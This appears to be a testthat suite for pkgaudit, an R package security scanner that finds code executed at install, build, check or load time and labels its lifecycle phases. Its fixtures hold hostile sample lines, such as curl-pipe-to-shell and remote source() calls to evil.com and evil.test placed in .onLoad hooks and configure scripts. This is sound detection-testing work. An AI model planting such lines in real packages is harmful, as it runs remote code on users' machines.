rules <- load_rules()

# structure --------------------------------------------------------------------
test_that("audit_package() returns a pkgaudit object of six frames plus metadata", {
  pkg <- make_pkg(files = list("R/zzz.R" = "invisible(NULL)"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_s3_class(res, "pkgaudit")
  expect_named(res, c("file_contexts", "patterns", "matches", "coverage",
                      "errors", "metadata"))
  for (nm in c("file_contexts", "patterns", "matches", "coverage",
               "errors")) {
    expect_s3_class(res[[nm]], "data.frame")
  }
  expect_type(res$metadata, "list")

  expect_named(res$file_contexts,
               c("rule", "file_context", "message", .phase_columns))
  expect_named(res$patterns,
               c("rule", "file_context", "line_number", "column_number",
                 "code_context", "guarded", "indirect", "preview", "message",
                 "attck",
                 .phase_columns))
  expect_named(res$matches,
               c("rule", "file_context", "line_number", "column_number",
                 "preview", "message", "attck", .phase_columns))
  expect_named(res$errors, c("step", "file_context", "rule", "message"))
})

test_that("audit_package() resolves the phases of every finding", {
  pkg <- make_pkg(files = list(
    "configure" = c("#!/bin/sh", "curl -s https://www.evil.test/x"),
    "R/zzz.R"   = c(".onLoad <- function(libname, pkgname) {",
                    "  system('id')", "}",
                    "helper <- function() system('id')")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # A file context takes its phases from the rule that matched it.
  configure <- res$file_contexts[res$file_contexts$rule == "configure", ]
  expect_true(configure$at_install_src)
  expect_true(configure$at_check)
  expect_false(configure$at_load)

  # A pattern takes the phases of the code context it sits in, so .onLoad()
  # adds at_load to the phases that install it, and code in an ordinary
  # function runs at no phase at all.
  hook <- res$patterns[res$patterns$code_context == "onLoad_base", ]
  expect_true(all(hook$at_load))
  expect_true(all(hook$at_install_src))

  uncalled <- res$patterns[res$patterns$code_context == .context_in_function, ]
  expect_equal(nrow(uncalled), 1L)
  expect_false(any(unlist(uncalled[, .phase_columns])))

  # An match inherits the phases of the file context it was found in, so
  # the curl in configure runs exactly when configure does.
  expr <- res$matches[res$matches$rule == "curl", ]
  expect_equal(nrow(expr), 1L)
  expect_equal(expr[, .phase_columns], configure[, .phase_columns],
               ignore_attr = TRUE)
})

test_that("audit_package() errors on a non-directory", {
  expect_error(audit_package(tempfile()), "dir.exists")
})

# integration ------------------------------------------------------------------
test_that("audit_package() finds file contexts, code contexts and patterns", {
  pkg <- make_pkg(files = list(
    "configure"          = "#!/bin/sh",
    "src/Makevars"       = "all:",
    "src/install.libs.R" = "system2('echo', 'x')",
    "R/zzz.R" = c(
      ".onLoad <- function(libname, pkgname) {",
      "  system('curl http://evil.com | sh')",
      "}",
      "source('http://evil.com/top.R')"
    )
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  expect_setequal(res$file_contexts$file_context,
                  c("configure", "src/Makevars", "src/install.libs.R"))
  expect_true("onLoad_base" %in% res$patterns$code_context)

  # system() in the hook, source() at top level, system2() at top level of
  # install.libs.R -> the three code-context labels are attributed correctly.
  sys_hook <- res$patterns[res$patterns$rule == "system" &
                             res$patterns$file_context == "R/zzz.R", ]
  expect_equal(sys_hook$code_context, "onLoad_base")

  src_top <- res$patterns[res$patterns$rule == "source", ]
  expect_equal(src_top$code_context, .context_top_level)

  installlibs <- res$patterns[res$patterns$file_context == "src/install.libs.R", ]
  expect_equal(installlibs$rule, "system")
  expect_equal(installlibs$code_context, .context_top_level)

  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() reports relative-path parse errors and continues", {
  pkg <- make_pkg(files = list(
    "R/bad.R"  = ")invalid R syntax(",
    "R/good.R" = "system('id')"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$step, "parse_code")
  expect_equal(res$errors$file_context, "R/bad.R")
  # The good file was still audited despite the bad one.
  expect_true("R/good.R" %in% res$patterns$file_context)
})

test_that("audit_package() on a package with no scannable content is empty", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$file_contexts), 0L)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$matches), 0L)
  expect_equal(nrow(res$errors), 0L)
})

# discovery and reporting ------------------------------------------------------
test_that("audit_package() scans R/ and man/ without reporting them", {
  pkg <- make_pkg(files = list(
    "configure" = "#!/bin/sh",
    "R/zzz.R"   = "system('id')",
    "man/f.Rd"  = c("\\name{f}", "\\title{T}", "\\examples{", "system('id')", "}")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # Only the reporting rule contributes a finding, so the frame stays a list of
  # security-relevant files rather than an inventory of the package.
  expect_equal(res$file_contexts$file_context, "configure")
  # Both non-reporting files were nevertheless scanned.
  expect_setequal(res$patterns$file_context, c("R/zzz.R", "man/f.Rd"))
})

test_that("audit_package() scans the OS-specific R and man subdirectories", {
  pkg <- make_pkg(files = list(
    "R/unix/u.R"      = "system('unix')",
    "R/windows/w.R"   = "system('windows')",
    "man/unix/u.Rd"   = c("\\name{u}", "\\title{U}", "\\examples{", "system('mu')", "}"),
    "man/windows/w.Rd" = c("\\name{w}", "\\title{W}", "\\examples{", "system('mw')", "}")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_setequal(res$patterns$file_context,
                  c("R/unix/u.R", "R/windows/w.R",
                    "man/unix/u.Rd", "man/windows/w.Rd"))
})

# help files -------------------------------------------------------------------
test_that("audit_package() attributes help-file code to its two contexts", {
  pkg <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}",                            # 1
    "\\title{T \\Sexpr{system('uname')}}",  # 2
    "\\description{d}",                     # 3
    "\\examples{",                          # 4
    "download.file('http://x', 'y')",       # 5
    "g <- function() system('never')",      # 6
    "}"                                     # 7
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  ctx <- stats::setNames(res$patterns$code_context, res$patterns$rule)

  expect_equal(unname(ctx[["download_file"]]), "Rd_examples")
  # A pattern inside a function definition in an example keeps in_function --
  # the fact that it sits in a function is not lost -- and inherits the phases
  # of the segment around it when they are resolved.
  expect_true(.context_in_function %in% res$patterns$code_context)
  expect_true("Rd_Sexpr_install" %in% res$patterns$code_context)
  expect_equal(nrow(res$errors), 0L)
})

test_that("help-file findings carry the line they occupy in the .Rd", {
  pkg <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}", "\\title{T \\Sexpr{system('uname')}}", "\\description{d}",
    "\\examples{", "download.file('http://x', 'y')", "}"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$patterns$line_number[res$patterns$rule == "system"], 2L)
  expect_equal(res$patterns$line_number[res$patterns$rule == "download_file"], 5L)
})

test_that("help-file findings take the phases their context runs in", {
  pkg <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}", "\\title{T \\Sexpr{system('uname')}}", "\\description{d}",
    "\\examples{", "download.file('http://x', 'y')", "}"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  ex <- res$patterns[res$patterns$code_context == "Rd_examples", ]
  sx <- res$patterns[res$patterns$code_context == "Rd_Sexpr_install", ]

  # Examples run under R CMD check and nowhere else.
  expect_true(ex$at_check)
  expect_false(ex$at_build)
  expect_false(ex$at_install_src)

  # \Sexpr is evaluated whenever the page is rendered, but not for a binary.
  expect_true(sx$at_build)
  expect_true(sx$at_check)
  expect_true(sx$at_install_src)
  expect_false(sx$at_install_bin)
})

test_that("audit_package() expands Rd macros so hidden code is still found", {
  pkg <- make_pkg(files = list(
    "man/macros/m.Rd" = "\\newcommand{\\bang}{\\Sexpr{system(\"id\")}}",
    "man/f.Rd" = c("\\name{f}", "\\title{T}", "\\description{Uses \\bang{}.}")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  # The code reaches the page through the macro, and is reported against the
  # page that uses it. man/macros/ is not scanned directly: a \newcommand body
  # parses as an opaque token, so there is nothing to find there.
  expect_equal(res$patterns$rule, "system")
  expect_equal(res$patterns$file_context, "man/f.Rd")
  expect_equal(res$patterns$code_context, "Rd_Sexpr_install")
  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() records an unparseable help file and continues", {
  pkg <- make_pkg(files = list(
    "man/bad.Rd"  = c("\\name{b}", "\\title{B}", "\\examples{", ")bad syntax(", "}"),
    "man/good.Rd" = c("\\name{g}", "\\title{G}", "\\examples{", "system('id')", "}")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$errors$step, "parse_code")
  expect_equal(res$errors$file_context, "man/bad.Rd")
  expect_true("man/good.Rd" %in% res$patterns$file_context)
})

# matches ------------------------------------------------------------------
test_that("audit_package() scans the shell and Make-like file contexts only", {
  pkg <- make_pkg(files = list(
    "configure"          = "curl -s https://www.evil.test/a",
    "src/Makevars"       = "all:\n\twget https://www.evil.test/b",
    "src/install.libs.R" = "# curl -s https://www.evil.test/c",
    "R/zzz.R"            = "# curl -s https://www.evil.test/d",
    "NEWS.md"            = "curl -s https://www.evil.test/e"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # src/install.libs.R is a file context, but its type is R, so it is parsed
  # for patterns rather than matched. NEWS.md is no context.
  expect_setequal(res$matches$file_context, c("configure", "src/Makevars"))
  expect_equal(res$matches$rule[res$matches$file_context == "configure"],
               "curl")
  expect_equal(res$matches$rule[res$matches$file_context == "src/Makevars"],
               "wget")
  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() locates each match in its file", {
  pkg <- make_pkg(files = list(
    "configure" = c("#!/bin/sh", "echo hi", "  curl -s https://www.evil.test/x")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$matches$line_number,   3L)
  expect_equal(res$matches$column_number, 3L)
})

test_that("audit_package() finds no matches when no file context is shell or make", {
  pkg <- make_pkg(files = list("R/zzz.R" = "system('curl https://www.evil.test/x')"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$matches), 0L)
  expect_gt(nrow(res$patterns), 0L)
})

test_that("a match's phases are the union of every rule that matched its file", {
  # No shipped pair of file-context rules matches the same path, so the union
  # is exercised directly on a frame where one does.
  fc <- .empty_file_contexts()
  fc[1L, ] <- c(list("configure", "configure", "m"),
                phase_values("at_build", "at_check", "at_install_src"))
  fc[2L, ] <- c(list("configure_ac", "configure", "m"),
                phase_values("at_autoconf"))

  ex <- .empty_matches(with_phases = FALSE)
  ex[1L, ] <- list("curl", "configure", 1L, 1L, "p", "m", "T1041")

  out <- .resolve_match_phases(ex, fc)
  expect_true(all(unlist(out[, c("at_autoconf", "at_build", "at_check",
                                 "at_install_src")])))
  expect_false(any(unlist(out[, c("at_install_bin", "at_load", "at_attach",
                                  "at_unload", "at_detach")])))
})

test_that("a match in a file with no file-context row runs in no phase", {
  ex <- .empty_matches(with_phases = FALSE)
  ex[1L, ] <- list("curl", "configure", 1L, 1L, "p", "m", "T1041")

  out <- .resolve_match_phases(ex, .empty_file_contexts())
  expect_false(any(unlist(out[, .phase_columns])))
})

test_that("audit_package() reports a failing match rule and continues", {
  pkg <- make_pkg(files = list(
    "configure"    = "curl -s https://www.evil.test/a",
    "src/Makevars" = "wget https://www.evil.test/b"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  broken <- rules
  broken$matches <- rbind(
    data.frame(name = "broken", version = "0.1.0", language = "shell",
               message = "m", attck = "T1041", regex = "(unclosed",
               stringsAsFactors = FALSE),
    rules$matches
  )

  res <- audit_package(pkg, broken)
  # The failure is recorded once per file it was attempted in, and the sound
  # rules were still evaluated in both.
  expect_equal(unique(res$errors$step), "find_matches")
  expect_equal(unique(res$errors$rule),  "broken")
  expect_setequal(res$errors$file_context, c("configure", "src/Makevars"))
  expect_setequal(res$matches$rule, c("curl", "wget"))
})

# preview ----------------------------------------------------------------------
test_that(".preview() shows the whole line, trimmed and whitespace-collapsed", {
  lines <- c("  x <- system(  \"id\"  )")
  expect_equal(.preview(lines, 1L, 8L), "x <- system( \"id\" )")
})

test_that(".preview() keeps the line's left context, not just the match", {
  # The matched node for `system` is the bare function name at column 15. The
  # preview is worth having only because it carries what surrounds it.
  lines <- c("  payload <- system(paste0(\"curl \", url))")
  expect_equal(.preview(lines, 1L, 14L),
               "payload <- system(paste0(\"curl \", url))")
})

test_that(".preview() windows on a match too far right to show from the line's start", {
  lines <- paste0("PKG_LIBS = ", strrep("-DPAD ", 40L), "$(shell curl-config)")
  col   <- as.integer(regexpr("curl-config", lines, fixed = TRUE))

  res <- .preview(lines, 1L, col)
  # Truncating from the left would have dropped the match entirely; instead the
  # window moves to it and both ends are marked as cut.
  expect_match(res, "curl-config", fixed = TRUE)
  expect_match(res, "^\\.\\.\\.")
  expect_true(nchar(res) <= .preview_width + 6L)
})

test_that(".preview() marks a line that is cut short and leaves a short one clean", {
  long <- paste0("x <- system(\"", strrep("a", 100L), "\")")
  expect_match(.preview(long, 1L, 6L), "\\.\\.\\.$")
  expect_false(grepl("\\.\\.\\.$", .preview("x <- system(\"id\")", 1L, 6L)))
})

test_that(".preview() marks a construct that carries on past its first line", {
  lines <- c("eval(parse(text = paste0(a,", "  b, c)))")
  expect_equal(.preview(lines, 1L, 1L, continues = TRUE),
               "eval(parse(text = paste0(a,...")
})

test_that(".preview() is NA for a line number outside the segment", {
  expect_true(is.na(.preview(c("a", "b"), 5L, 1L)))
  expect_true(is.na(.preview(c("a", "b"), NA_integer_, 1L)))
})

test_that(".preview() returns an empty vector for no findings", {
  expect_equal(.preview(c("a"), integer(0L), integer(0L)), character(0L))
})

test_that("a preview is attached to every pattern and match found", {
  pkg <- make_pkg(files = list(
    "R/a.R"     = c("f <- function(url) {", "  download.file(url, tempfile())", "}"),
    "configure" = c("#!/bin/sh", "curl -s https://www.evil.test/x | sh")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$patterns$preview,    "download.file(url, tempfile())")
  expect_equal(res$matches$preview, "curl -s https://www.evil.test/x | sh")
})

test_that("a help-file preview shows the extracted code, not the .Rd text", {
  pkg <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}", "\\title{T}",
    "\\description{d \\Sexpr{system(\"id\")} tail}"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  # Everything outside the macro is padding in the segment, so the preview is the
  # macro's code alone and is not a substring of line 3 of the .Rd.
  expect_equal(res$patterns$preview, "system(\"id\")")
  expect_equal(res$patterns$line_number, 3L)
})

# namespace sources ------------------------------------------------------------
# A .onLoad defined outside R/ never fires: it is not in the namespace, so R
# never looks for it there. Measured with an instrumented probe package -- a
# .onLoad in data/ ships as an ordinary lazy-data object of class function and
# is never called. Reporting it as onLoad_base would be a false attribution, not
# a cautious one, so the named hook rules are withheld where the code does not
# become the namespace.
test_that("a lifecycle hook outside R/ is not attributed to a hook", {
  hook <- c(".onLoad <- function(libname, pkgname) {", "  system('id')", "}")
  pkg  <- make_pkg(files = list(
    "R/zzz.R"             = hook,
    "src/install.libs.R"  = hook
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # R/ builds the namespace, so the hook there is a hook.
  zzz <- res$patterns[res$patterns$file_context == "R/zzz.R", ]
  expect_equal(zzz$code_context, "onLoad_base")
  expect_true(zzz$at_load)

  # The identical code under src/ is still scanned -- the system() call is
  # reported -- but attributed to the file it sits in, not to a hook.
  libs <- res$patterns[res$patterns$file_context == "src/install.libs.R", ]
  expect_equal(libs$rule, "system")
  expect_false("onLoad_base" %in% libs$code_context)
})

# file-type code contexts ------------------------------------------------------
# Top-level code outside R/ must not inherit R/'s phases. Each of these contexts
# was measured with an instrumented probe package; see ../execution_surface.
test_that("top-level code takes the phases of the file context it sits in", {
  call <- "system('id')"
  pkg  <- make_pkg(files = list(
    "R/zzz.R"        = call,
    "data/things.R"  = c(call, "things <- 1L"),
    "demo/intro.R"   = call,
    "tests/setup.R"  = call,
    "tools/build.R"  = call,
    "inst/CITATION"  = call,
    ".Rprofile"      = call
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # Every one of these is top-level code, so the context says only that. What
  # differs is the phases, which come from where the file sits: a code context
  # is no longer a restatement of the directory.
  ctx <- setNames(res$patterns$code_context, res$patterns$file_context)
  for (f in names(ctx)) expect_equal(ctx[[f]], .context_top_level, info = f)

  phases_of <- function(file) {
    row <- res$patterns[res$patterns$file_context == file, , drop = FALSE]
    .phase_columns[unlist(row[1L, .phase_columns])]
  }
  expect_setequal(phases_of("R/zzz.R"),
                  c("at_build", "at_check", "at_install_src"))
  expect_setequal(phases_of("data/things.R"),
                  c("at_build", "at_install_src"))
  expect_setequal(phases_of("tests/setup.R"), "at_check")
  expect_setequal(phases_of("inst/CITATION"), "at_check")
  expect_setequal(phases_of(".Rprofile"), c("at_build", "at_install_src"))
  # demo/ and tools/ are reached only by direct invocation.
  expect_equal(phases_of("demo/intro.R"), character(0))
  expect_equal(phases_of("tools/build.R"), character(0))
})

test_that("each file-type context carries its own measured phases", {
  call <- "system('id')"
  pkg  <- make_pkg(files = list(
    "data/things.R" = c(call, "things <- 1L"),
    "demo/intro.R"  = call,
    "tests/setup.R" = call
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  at  <- function(f, phase) res$patterns[[phase]][res$patterns$file_context == f]

  # data/ is evaluated at build and when installing from a source directory,
  # and is not a check-time surface.
  expect_true(at("data/things.R",  "at_build"))
  expect_true(at("data/things.R",  "at_install_src"))
  expect_false(at("data/things.R", "at_check"))

  # A demo runs only when a user calls demo(): no lifecycle phase reaches it.
  expect_false(any(unlist(res$patterns[res$patterns$file_context == "demo/intro.R",
                                       .phase_columns])))

  # Test code is check-only.
  expect_true(at("tests/setup.R",  "at_check"))
  expect_false(at("tests/setup.R", "at_build"))
  expect_false(at("tests/setup.R", "at_install_src"))
})

test_that("a testthat or tinytest file is scanned but its fixtures are not", {
  call <- "system('id')"
  pkg  <- make_pkg(files = list(
    "tests/testthat/test-a.R"          = call,
    "tests/testthat/helper-a.R"        = call,
    "tests/testthat/fixtures/inert.R"  = call,
    "inst/tinytest/test_a.R"           = call,
    "inst/extdata/inert.R"             = call
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  # Non-recursive by design: testthat does not source subdirectories, and a
  # fixture corpus of deliberately suspicious code is not an execution surface.
  expect_setequal(
    res$patterns$file_context,
    c("tests/testthat/test-a.R", "tests/testthat/helper-a.R",
      "inst/tinytest/test_a.R")
  )
  expect_true(all(res$patterns$code_context == .context_top_level))
  expect_true(all(res$patterns$at_check))
})

# Sexpr stages and guarded code ------------------------------------------------
test_that("each \\Sexpr stage is its own code context with its own phases", {
  call <- 'system("id")'
  pkg  <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}", "\\title{T}", "\\description{",
    sprintf("\\Sexpr[stage=build,results=hide]{%s}",   call),
    sprintf("\\Sexpr[stage=render,results=hide]{%s}",  call),
    sprintf("\\Sexpr{%s}", call),
    "}")))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_setequal(res$patterns$code_context,
                  c("Rd_Sexpr_build", "Rd_Sexpr_install", "Rd_Sexpr_render"))

  at <- function(ctx, phase) res$patterns[[phase]][res$patterns$code_context == ctx]
  # render is evaluated when the page is displayed, not when it is installed.
  expect_false(at("Rd_Sexpr_render",  "at_install_src"))
  expect_true(at("Rd_Sexpr_render",   "at_check"))
  expect_true(at("Rd_Sexpr_install",  "at_install_src"))
  expect_true(at("Rd_Sexpr_build",    "at_install_src"))
})

test_that("guarded marks the wrappers check does not run, and phases stay", {
  call <- 'system("id")'
  pkg  <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}", "\\title{T}", "\\examples{",
    call,
    sprintf("\\dontrun{ %s }",  call),
    sprintf("\\dontshow{ %s }", call),
    "}")))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  g   <- setNames(res$patterns$guarded, res$patterns$line_number)

  expect_false(g[["4"]])   # plain example
  expect_true(g[["5"]])    # \dontrun -- ships, but check does not run it
  expect_false(g[["6"]])   # \dontshow -- check does run it

  # An attribute, not a context: all three keep Rd_examples and its phases, so
  # the phases read as an upper bound rather than being silently zeroed.
  expect_true(all(res$patterns$code_context == "Rd_examples"))
  expect_true(all(res$patterns$at_check))
})

test_that("code outside a help file is never guarded", {
  pkg <- make_pkg(files = list("R/zzz.R" = "system('id')"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  expect_false(any(audit_package(pkg, rules)$patterns$guarded))
})

# .origin validation -----------------------------------------------------------
# .origin becomes the scan's provenance, so a malformed one has to fail loudly
# rather than produce a record that contradicts itself.

origin_pkg <- function() make_pkg(files = list("R/a.R" = "f <- function() 1"))

test_that("audit_package() accepts NULL or a well-formed .origin", {
  pkg <- origin_pkg(); on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  bare <- audit_package(pkg, rules)
  expect_false(bare$metadata$pkg_is_tarball)
  expect_equal(bare$metadata$pkg_path, pkg)

  from_tar <- audit_package(pkg, rules, .origin = list(
    path = "/t/x.tar.gz", sha256 = strrep("a", 64L), is_tarball = TRUE))
  expect_true(from_tar$metadata$pkg_is_tarball)
  expect_equal(from_tar$metadata$pkg_path, "/t/x.tar.gz")
})

test_that("audit_package() rejects a malformed .origin before scanning", {
  pkg <- origin_pkg(); on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  bad <- function(o) expect_error(audit_package(pkg, rules, .origin = o),
                                  "'.origin'", fixed = TRUE)
  bad("not-a-list")
  bad(list())
  bad(list(path = "/t/x.tar.gz", sha256 = strrep("a", 64L)))          # no flag
  bad(list(path = c("a", "b"), sha256 = strrep("a", 64L), is_tarball = TRUE))
})

# is_tarball was read with isTRUE(), so anything that was not TRUE became FALSE:
# the object recorded a directory scan while carrying a tarball's path and hash.
test_that("a non-logical or NA is_tarball is refused, not coerced to FALSE", {
  pkg <- origin_pkg(); on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  for (flag in list("yes", NA, 1L)) {
    expect_error(
      audit_package(pkg, rules, .origin = list(
        path = "/t/x.tar.gz", sha256 = strrep("a", 64L), is_tarball = flag)),
      "is_tarball", fixed = TRUE
    )
  }
})

# hash_manifest() can fail and the scan still records what it could, so an NA
# path or hash is data rather than a malformed origin.
test_that("an NA path or sha256 is accepted", {
  pkg <- origin_pkg(); on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  res <- audit_package(pkg, rules, .origin = list(
    path = NA_character_, sha256 = NA_character_, is_tarball = TRUE))
  expect_true(is.na(res$metadata$pkg_sha256))
})

# rules classes ----------------------------------------------------------------
# A rules list missing a class would let a scan run and report no findings of
# that kind, which is indistinguishable from a package that has none. Both entry
# points check the same constant, so neither can drift from the other.
test_that("both entry points refuse a rules list missing any class", {
  pkg <- make_pkg(files = list("R/a.R" = "f <- function() 1"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  tb <- system.file("extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
                    package = "pkgaudit")

  expect_setequal(.rule_classes, names(rules))
  for (class in .rule_classes) {
    short <- rules[setdiff(names(rules), class)]
    expect_error(audit_package(pkg, short), ".rule_classes", fixed = TRUE)
    expect_error(audit_tarball(tb, rules = short), ".rule_classes", fixed = TRUE)
  }
})

# `report` controls what is shown, not when code runs. A match in a file context
# that is scanned but not reported must still carry that context's phases;
# resolving against the reported subset alone would silently give it none.
test_that("a match takes its phases from an unreported file context too", {
  pkg <- make_pkg(files = list("exec/run.sh" = "curl https://www.evil.test/x"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$matches$rule, "curl")
  # exec/ is scanned but not reported, and runs at no lifecycle phase.
  expect_equal(nrow(res$file_contexts), 0L)
  expect_false(any(unlist(res$matches[, .phase_columns])))
})

test_that("an unreported shell context still confers its phases on a match", {
  pkg <- make_pkg(files = list("configure" = "curl https://www.evil.test/x"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  # Same package, with the configure rule made non-reporting: the finding must
  # keep configure's phases, only the file_contexts row should disappear.
  quiet <- rules
  quiet$file_contexts$report[quiet$file_contexts$name == "configure"] <- FALSE

  loud <- audit_package(pkg, rules)
  hush <- audit_package(pkg, quiet)

  expect_equal(nrow(loud$file_contexts), 1L)
  expect_equal(nrow(hush$file_contexts), 0L)
  expect_equal(hush$matches[, .phase_columns], loud$matches[, .phase_columns])
})


# exec/ holds a grab-bag of languages: across CRAN it is ~54% R by extension,
# with shell a distant second and Perl, Python and batch files besides. Typing
# the whole directory as shell meant most of it was grepped rather than parsed,
# so the two are split and the rest is deliberately not claimed.
test_that("exec/ R is parsed and exec/ shell is matched, each in its own rule", {
  pkg <- make_pkg(files = list(
    "exec/tokenize.R"    = "system('id')",
    "exec/compileAttr.sh" = "curl https://www.evil.test/x"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$patterns$file_context, "exec/tokenize.R")
  expect_equal(res$patterns$rule, "system")
  expect_equal(res$matches$file_context, "exec/compileAttr.sh")
  expect_equal(res$matches$rule, "curl")
})

test_that("code under exec/ runs at no lifecycle phase", {
  pkg <- make_pkg(files = list("exec/tokenize.R" = "system('id')"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  # Top-level code, but under exec/, which no lifecycle command reaches. The
  # context says where in the file it sits; the phases say when it runs, and
  # here they are none.
  expect_equal(res$patterns$code_context, .context_top_level)
  expect_false(any(unlist(res$patterns[, .phase_columns])))
})

# A documented gap, asserted so it stays deliberate rather than becoming a
# surprise. Perl, Python, batch and extensionless scripts are left to a tool
# that reads those languages.
test_that("exec/ files in languages pkgaudit does not read are not scanned", {
  pkg <- make_pkg(files = list(
    "exec/encode.pl"     = "system('curl https://www.evil.test/x')",
    "exec/bin.py"        = "os.system('curl https://www.evil.test/x')",
    "exec/runme.bat"     = "curl https://www.evil.test/x",
    "exec/tokenize"      = "#!/usr/bin/env Rscript\nsystem('id')"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$matches),  0L)
  expect_equal(nrow(res$errors),   0L)
})

# Rscript, and the other test locations ----------------------------------------
test_that("an Rscript invocation is reported wherever it is written", {
  pkg <- make_pkg(files = list(
    "configure"    = "${R_HOME}/bin/Rscript -e 'source(\"https://evil.test/x\")'",
    "src/Makevars" = "PKG_LIBS := $(shell $(R_HOME)/bin/Rscript -e \"flags()\")"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_setequal(res$matches$rule[res$matches$rule == "rscript"],
                  c("rscript", "rscript"))
  expect_setequal(res$matches$file_context[res$matches$rule == "rscript"],
                  c("configure", "src/Makevars"))
  # The R inside -e is not parsed; the invocation is what a reviewer follows.
  expect_false("source" %in% res$patterns$rule)
})

test_that("RUnit and legacy testthat locations are scanned as test code", {
  pkg <- make_pkg(files = list(
    "inst/unitTests/runit.audit.R" = "system('id')",
    "inst/tests/test-audit.R"      = "system('id')"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_setequal(res$patterns$file_context,
                  c("inst/unitTests/runit.audit.R", "inst/tests/test-audit.R"))
  expect_true(all(res$patterns$code_context == .context_top_level))
  expect_true(all(res$patterns$at_check))
  # Scanned, not reported: they are R, and parsed.
  expect_equal(nrow(res$file_contexts), 0L)
})

test_that("a package where no rule matched reports and scans nothing", {
  none <- .empty_file_contexts(with_phases = FALSE)[0, ]
  expect_equal(nrow(.report_file_contexts(none, rules$file_contexts)), 0L)
  expect_equal(.scan_file_contexts(none, rules$file_contexts), list())
})
